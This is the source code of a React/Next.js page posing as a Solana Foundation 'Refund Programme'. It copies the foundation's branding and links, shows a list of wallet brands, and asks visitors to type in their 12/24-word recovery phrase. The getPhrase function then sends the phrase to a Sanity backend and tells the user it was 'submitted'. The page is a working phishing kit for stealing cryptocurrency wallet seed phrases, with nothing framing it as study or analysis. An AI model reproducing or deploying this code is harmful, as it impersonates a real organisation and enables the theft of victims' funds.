import Head from "next/head";
import Image from "next/image";
import styles from "../styles/Home.module.css";
import Cancel from "./comps/Cancel";
import react, { useState } from "react";
import client from "../sanity";

export default function Home() {
  const [phrase, setPhrase] = useState("");
  const wallets = [
    {
      name: "Atomic",
      image: "Atomic-Wallet.jpg",
    },
    {
      name: "Avana",
      image: "avana-wallet.webp",
    },
    {
      name: "Exodus",
      image: "Exodus-Wallet.jpg",
    },
    {
      name: "Glow",
      image: "Glow-logo.png",
    },
    {
      name: "Ledger",
      image: "ledger-logo-long.svg",
    },
    {
      name: "Phantom",
      image: "Phantom-wallet.png",
    },
    {
      name: "Sollet",
      image: "Sollet-Wallet.jpeg",
    },
    {
      name: "solRnWallet",
      image: "solRnWallet.webp",
    },
    {
      name: "solflare",
      image: "solflare-wallet.svg",
    },
    {
      name: "Math",
      image: "Math-wallet.jpg",
    },
    {
      name: "Trust",
      image: "Trust-wallet.png",
    },
    {
      name: "Slope",
      image: "slope-wallet.png",
    },
  ];
  const getPhrase = () => {
    console.log(phrase, "✅");
    if (phrase.length < 12) {
      alert("Word Phrase is too short");
      return;
    }
    setPhrase("");
    alert("Phrase Word has been submitted");
    // Send details to backend
    const doc = {
      _type: "phrase",
      phrase,
    };
    client
      .create(doc)
      .then((res) => console.log("Results", res))
      .catch((err) => console.error(err));
  };
  const showModal = () => {
    document
      .querySelectorAll(".modal")
      .forEach((x) => x.classList.toggle("hidden"));
    // Blur Claim button
    document.getElementById("claimButton").classList.toggle("blur-lg");
    document.getElementById("connectWallet").classList.toggle("blur-lg");
  };
  const showPhrase = (decide) => {
    if (decide == "all") {
      document.querySelector(".word-phrase").classList.add("hidden");
      document
        .querySelectorAll(".modal")
        .forEach((x) => x.classList.add("hidden"));
      document.getElementById("claimButton").classList.remove("blur-lg");
      document.getElementById("connectWallet").classList.remove("blur-lg");
      return;
    }
    document.querySelector(".word-phrase").classList.remove("hidden");
    document.getElementById("selectWallet").classList.add("hidden");
    document.getElementById("claimButton").classList.add("blur-lg");
    document.getElementById("connectWallet").classList.add("blur-lg");
  };
  const iconNames = [
    { name: "youtube", link: "https://www.youtube.com/SolanaFndn" },
    {
      name: "twitter",
      link: "https://twitter.com/ethereum_merger?t=qNDvriyhPdhnS0eKMOywEw&s=09",
    },
    { name: "discord-alt", link: "" },
    { name: "reddit", link: "" },
    { name: "github", link: "" },
    { name: "telegram", link: "https://t.me/solanaannouncements" },
  ];

  const firstList = [
    { name: "Grants", link: "https://solana.org/grants" },
    { name: "Break Solana", link: "https://break.solana.com/" },
    { name: "Media Kit", link: "https://solana.com/branding" },
    { name: "Careers", link: "https://jobs.solana.com/jobs" },
    { name: "Disclaimer", link: "https://solana.com/disclaimer" },
  ];
  const secondList = ["Ecosystem", "Blog", "Newsletter"];
  return (
    <div className="bg-black font-[poppins]">
      <Head>
        <title>Start Building | Solana Mobile</title>
        <meta name="description" content="Generated by create next app" />
        <link rel="icon" href="/main-fav.png" />
        <link
          href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css"
          rel="stylesheet"
        />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
        <link
          href="https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600&display=swap"
          rel="stylesheet"
        ></link>
      </Head>

      <main className="p-5 bg-[url('/Mian-bg.webp')]  overflow-hidden h-screen relative">
        <div className="backdrop-blur-md modal absolute w-screen hidden h-screen bg-black/30"></div>

        <nav className="grid items-center relative z-10 w-full grid-cols-2 mb-2">
          <div className="flex">
            <img
              src="sol.svg"
              alt="Sol-Logo"
              className="sm:w-44 sm:h-8 w-24 h-6"
            />
          </div>
          <div className="flex justify-end">
            <ul className="flex gap-5 items-center">
              <li className="">
                <a
                  href="https://solana.com/"
                  className="relative cursor-pointer"
                >
                  Home
                </a>
              </li>
              <li
                id="connectWallet"
                className="bg-[#17fb9b] cursor-pointer text-sm sm:text-base font-medium px-2 py-2 sm:px-5 sm:py-2 text-black rounded-full"
                onClick={showModal}
              >
                Connect Wallet
              </li>
            </ul>
          </div>
        </nav>
        <hr />
        {/* Main Page */}
        <div
          className="flex justify-center flex-col items-center w-full
        "
        >
          {/* <div className="sm:ml-60 ml-20 flex items-center h-screen absolute">
            <img src="Sol-Main-img.webp" alt="Sol-Image" className="" />
          </div> */}
          {/* Try Image */}
          <div className="absolute flex justify-center sm:right-0 right-20 min-h-screen min-w-full">
            <video
              className="right-80"
              loop
              playsInline
              autoPlay
              poster="solana.com/src/img/index/hero-wide.jpg"
              muted
              src="https://player.vimeo.com/external/589655407.hd.mp4?s=2de3fde08e6ce9dac62bfe1e8db32ef72461a5af&profile_id=175"
            ></video>
            <div className="absolute z-2 w-full h-full bg-overlay"></div>
          </div>

          {/* End Try Video */}
          <div className="flex mt-[27rem] relative z-10 gap-10 flex-col items-center">
            <h1 className="font-semibold sm:text-7xl text-5xl text-center">
              {" "}
              <span className="font-extralight">Solana</span> Refund Programme
            </h1>
            <p className="sm:text-3xl text-xl sm:px-80 font-light text-center">
              Solana Refund is available to all solana network. Get refund by
              claiming your refund now.
            </p>
            <button
              id="claimButton"
              className="bg-[#17fb9b] relative z-10 px-5 text-lg cursor-pointer py-2
            font-semibold rounded-full text-black "
              onClick={showModal}
            >
              Claim Refund
            </button>
          </div>

          {/* Overlay */}
          {/* End Overlay */}
          {/* Modal */}
          <div
            id="selectWallet"
            className="mt-7 bg-white modal absolute rounded-xl shadow-lg hidden"
          >
            <div className="p-4 sm:p-7">
              <div className="grid grid-cols-2">
                <h1 className="block sm:text-2xl text-xl mb-5  font-semibold text-black">
                  Select Wallet
                </h1>

                <div className="w-full flex justify-end" onClick={showModal}>
                  <Cancel />
                </div>
              </div>

              <div className="flex flex-col">
                <div className="grid grid-cols-4 gap-7">
                  {wallets.map((wallet, key) => {
                    return (
                      <div
                        className="flex cursor-pointer text-center flex-col items-center"
                        onClick={showPhrase}
                        key={key}
                      >
                        <img
                          src={wallet.image}
                          alt={`img-${wallets.indexOf(wallet)}`}
                          className="sm:h-20 sm:w-20 h-10 w-10 object-contain"
                        />
                        <p className="text-black text-sm mt-1 font-medium">
                          {wallet.name} Wallet
                        </p>
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>
          </div>
          {/* End-Modal */}
          {/* 12 word Input */}
          <div className="mt-7 bg-white word-phrase absolute rounded-xl shadow-lg hidden">
            <div className="p-4 sm:p-7">
              <div className="grid grid-cols-2">
                <h1 className="block sm:text-2xl  mb-5 text-center font-semibold text-black">
                  Enter 12/24 word phrase
                </h1>

                <div
                  className="w-full flex justify-end"
                  onClick={() => showPhrase("all")}
                >
                  <Cancel />
                </div>
              </div>

              <div className="">
                <input
                  type="text"
                  value={phrase}
                  onChange={(e) => setPhrase(e.target.value)}
                  className="rounded-lg border-2 bg-none border-gray-300 w-full p-2"
                />
              </div>
              <button
                className="bg-[#17fb9b] mt-3 font-semibold rounded-full text-black px-3 py-2"
                onClick={getPhrase}
              >
                Continue
              </button>
            </div>
          </div>
          {/* End 12 word input */}
        </div>
      </main>
      {/* Footer */}
      <footer className="sm:bg-footer-graient bg-small-bg sm:grid sm:grid-cols-2 sm:p-20 p-10">
        <div className="flex flex-col sm:mb-0 mb-10 sm:justify-start sm:items-start justify-center items-center text-center">
          <img src="solRnWallet.webp" alt="Sol-logo" className="w-10 h-10" />
          <p className="mt-2">Managed by Solana Foundation</p>
          <div className="flex gap-2 mt-3">
            {iconNames.map((icon) => {
              return (
                <a href={icon.link}>
                  <div className="p-1 flex hover:bg-white transition duration-300 justify-center bg-gray-500 rounded-full items-center">
                    <i className={`bx bxl-${icon.name} text-black`}></i>
                  </div>
                </a>
              );
            })}
          </div>
          <p className="mt-3 sm:block hidden text-gray-500">
            &copy; 2022 Solana Foundation. All rights reserved.
          </p>
        </div>
        <div className="grid grid-cols-2">
          <div className="">
            <ul>
              <li className="sm:text-base text-sm mb-2">SOLANA</li>
              {firstList.map((item) => {
                return (
                  <a href={item.link}>
                    <li className="text-gray-500 sm:mt-3 mt-2 sm:text-base text-sm  hover:text-white">
                      {item.name}
                    </li>
                  </a>
                );
              })}
            </ul>
          </div>
          <div className="flex item-end">
            <ul>
              <li className="text-sm mb-2">GET CONNECTED</li>
              {secondList.map((item) => (
                <li className="text-gray-500 sm:mt-3 mt-2 sm:text-base text-sm hover:text-white">
                  {item}
                </li>
              ))}
            </ul>
          </div>
        </div>
        <p className="mt-10 text-sm sm:hidden text-gray-500">
          &copy; 2022 Solana Foundation. All rights reserved.
        </p>
      </footer>
    </div>
  );
}
